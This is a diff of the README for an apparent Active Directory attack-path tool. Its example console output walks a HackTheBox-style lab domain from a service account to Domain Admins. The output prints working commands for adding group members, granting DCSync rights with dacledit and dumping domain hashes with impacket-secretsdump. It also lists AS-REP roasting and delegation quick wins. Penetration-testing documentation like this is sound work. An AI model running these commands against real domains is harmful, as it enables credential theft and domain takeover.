@@ -74,29 +74,42 @@ HTML report. The HTML report shows:
 - **Identity tracking**, commands at each hop use the identity you have
   *right now*, not the node label in the graph.
 
-Example chain (console output):
+Example console output (best path + summary; full breakdown lives in the HTML report):
 
 ```
-john.doe@corp.local
-  └─[MemberOf]──► HELPDESK@corp.local
-       Structural relationship, no action required.
-  └─[GenericWrite]──► svc_backup@corp.local
-       $ pywhisker -d corp.local -u 'john.doe' ...
-     → now operating as: svc_backup@corp.local
-  └─[ForceChangePassword]──► bob@corp.local
-       $ net rpc password 'bob' ... -U 'corp.local/svc_backup%...'
-     → now operating as: bob@corp.local
-  └─[DCSync]──► DOMAIN ADMINS@corp.local
-       $ impacket-secretsdump -just-dc 'corp.local/bob:...'
+  ✓ SVC-ALFRESCO@HTB.LOCAL → DOMAIN ADMINS@HTB.LOCAL   7 hops, weight 10 [DCSync]
+
+    SVC-ALFRESCO@HTB.LOCAL
+      └─[MemberOf]──► SERVICE ACCOUNTS@HTB.LOCAL
+      └─[MemberOf]──► PRIVILEGED IT ACCOUNTS@HTB.LOCAL
+      └─[MemberOf]──► ACCOUNT OPERATORS@HTB.LOCAL
+      └─[GenericAll]──► EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL
+      └─[WriteDacl]──► HTB.LOCAL
+      └─[Contains]──► USERS@HTB.LOCAL
+      └─[Contains]──► DOMAIN ADMINS@HTB.LOCAL
+
+    # Step 1: GenericAll on EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL  (as SVC-ALFRESCO@HTB.LOCAL)
+      $ net rpc group addmem 'EXCHANGE WINDOWS PERMISSIONS' 'SVC-ALFRESCO' -U 'HTB.LOCAL/SVC-ALFRESCO%<SRC_PASSWORD>' -S <DC_IP>
+      $ bloodyAD --host <DC_IP> -d HTB.LOCAL -u 'SVC-ALFRESCO' -p '<SRC_PASSWORD>' add groupMember 'EXCHANGE WINDOWS PERMISSIONS' 'SVC-ALFRESCO'
+
+    # Step 2: WriteDacl on HTB.LOCAL  (as SVC-ALFRESCO@HTB.LOCAL)
+      $ dacledit.py -action write -rights DCSync -principal 'SVC-ALFRESCO' -target-dn 'DC=HTB,DC=LOCAL' 'HTB.LOCAL/SVC-ALFRESCO:<SRC_PASSWORD>' -dc-ip <DC_IP>
+      $ impacket-secretsdump -just-dc 'HTB.LOCAL/SVC-ALFRESCO:<SRC_PASSWORD>@<DC_IP>'
+
+    +2 more paths  →  see HTML report
+
+  ◆ Best pivot: FOREST.HTB.LOCAL (Unconstrained delegation, 4 hops onward)
+
+  ◆ Domain quick-wins:
+      • High-value target (9)
+      • Password not required (3)
+      • AS-REP roast (1)
+      • Unconstrained delegation (1)
+      • Domain Controller (1)
+    full details + commands  →  see HTML report
 ```
 
-## Exit codes
-
-| Code | Meaning |
-|------|---------|
-| `0` | Paths found |
-| `1` | Error (invalid ZIP, user not found, etc.) |
-| `2` | Ran cleanly but no path to the target |
+ANSI colors are emitted when stdout is a TTY (auto-disabled by `NO_COLOR=1`).
 
 ## Notes
 
